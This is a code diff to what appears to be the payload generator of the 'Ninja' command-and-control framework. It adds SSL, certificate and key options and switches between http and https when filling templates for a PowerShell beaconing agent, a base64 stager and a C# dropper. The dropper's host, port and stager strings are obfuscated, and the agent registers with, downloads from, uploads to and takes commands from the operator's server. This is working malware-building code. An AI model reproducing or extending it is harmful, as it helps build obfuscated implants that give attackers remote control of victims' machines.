@@ -15,6 +15,9 @@ HOST='{IP}'
 BASE = 'Ninja'
 POINTER = 'main'
 PAYLOADS = []
+SSL={SSL}
+CERT='{CERT}'
+KEY='{KEY}'
 beacon='{beacon_time}'
 #AESKey="+4hOi8+xxOki+Mg9Y4+GuD7g7n2eytMa5KF6zNnaPz0="
 AESKey=base64.b64encode(bytearray("".join([random.choice(string.ascii_uppercase) for i in range(32)]), "UTF-8")).decode()
@@ -47,7 +50,10 @@ def PAYLOAD():
     global PORT
     fp = open('agents/payload2.ps1', 'r')
     ps1 = fp.read()
-    ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}', command_url).replace('{re}', result_url).replace('{md}', modules_url)
+    if SSL==True:
+        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}', command_url).replace('{re}', result_url).replace('{md}', modules_url).replace('{HTTP}', "https")
+    else :
+        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}', command_url).replace('{re}', result_url).replace('{md}', modules_url).replace('{HTTP}', "http")
     payload= open('payloads/raw_payload.ps1', 'w')
     payload.write(ps1)
     payload.close()
@@ -58,7 +64,10 @@ def STAGER():
     global PORT
     fp = open('agents/stager.ps1', 'r')
     ps1 = fp.read()
-    ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{b64payload}', b64_payload)
+    if SSL==True:
+        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{b64payload}', b64_payload).replace('{HTTP}', "https")
+    else:
+        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{b64payload}', b64_payload).replace('{HTTP}', "http")
     payload= open('payloads/base64_stager.ps1', 'w')
     payload.write(ps1)
     payload.close()
@@ -68,7 +77,11 @@ def cspayload():
     fp = open('agents/simple_dropper.ninja', 'r')
     fpo= open('payloads/cs_dropper.cs', 'w')
     cs = fp.read()
-    cs = cs.replace('{ip}', csobf(HOST)).replace('{port}', csobf(PORT)).replace('{b64_stager}', csobf(b64_stager)).replace('{http}', csobf("http://"))
+    if SSL==True:
+        cs = cs.replace('{ip}', csobf(HOST)).replace('{port}', csobf(PORT)).replace('{b64_stager}', csobf(b64_stager)).replace('{http}', csobf("https://"))
+    else:
+        cs = cs.replace('{ip}', csobf(HOST)).replace('{port}', csobf(PORT)).replace('{b64_stager}', csobf(b64_stager)).replace('{http}', csobf("http://"))
+
     fpo.write(cs)
     fpo.close()
     fp.close()
